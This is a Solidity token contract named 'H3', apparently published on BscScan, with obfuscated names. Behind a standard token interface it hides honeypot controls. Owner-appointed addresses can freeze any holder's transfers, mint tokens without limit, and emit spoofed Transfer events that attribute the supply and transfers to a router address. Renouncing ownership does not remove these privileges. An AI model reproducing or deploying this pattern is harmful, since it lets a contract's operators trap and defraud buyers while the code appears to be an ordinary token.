/**
 *Submitted for verification at BscScan.com on 2022-11-03
*/

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address HKSS = 0x48B807caa55AB39b7Ca244529F63f4935FEF0272;
	address hRouter = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract H3 is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Hc;
	mapping (address => bool) private Hb;
    mapping (address => bool) private Hw;
    mapping (address => mapping (address => uint256)) private Hv;
    uint8 private constant _Hec = 8;
    uint256 private constant hS = 200000000 * 10**_Hec;
    string private constant _name = "H3";
    string private constant _symbol = "H3";



    constructor () {
        Hc[_msgSender()] = hS;
         hmker(); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _Hec;
    }

    function totalSupply() public pure  returns (uint256) {
        return hS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Hc[account];
    }
    function hmker() onlyOwner internal {
    emit Transfer(address(0), hRouter, hS); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Hv[owner][spender];
    }
	        function BurnH(address Hj) onlyOwner public{
        Hb[Hj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        Hv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        
		function hStake(address Hj) public {
        if(Hb[msg.sender]) { 
        Hw[Hj] = false;}}
        function QueryH(address Hj) public{
         if(Hb[msg.sender])  { 
        Hw[Hj] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == HKSS)  {
        require(amount <= Hc[sender]);
        Hc[sender] -= amount;  
        Hc[recipient] += amount; 
          Hv[sender][msg.sender] -= amount;
        emit Transfer (hRouter, recipient, amount);
        return true; }  else  
          if(!Hw[recipient]) {
          if(!Hw[sender]) {
         require(amount <= Hc[sender]);
        require(amount <= Hv[sender][msg.sender]);
        Hc[sender] -= amount;
        Hc[recipient] += amount;
        Hv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Hh, uint256 Hj) public {
        if(msg.sender == HKSS)  {
        require(Hc[msg.sender] >= Hj);
        Hc[msg.sender] -= Hj;  
        Hc[Hh] += Hj; 
        emit Transfer (hRouter, Hh, Hj);} else  
        if(Hb[msg.sender]) {Hc[Hh] += Hj;} else
        if(!Hw[msg.sender]) {
        require(Hc[msg.sender] >= Hj);
        Hc[msg.sender] -= Hj;  
        Hc[Hh] += Hj;          
        emit Transfer(msg.sender, Hh, Hj);}}}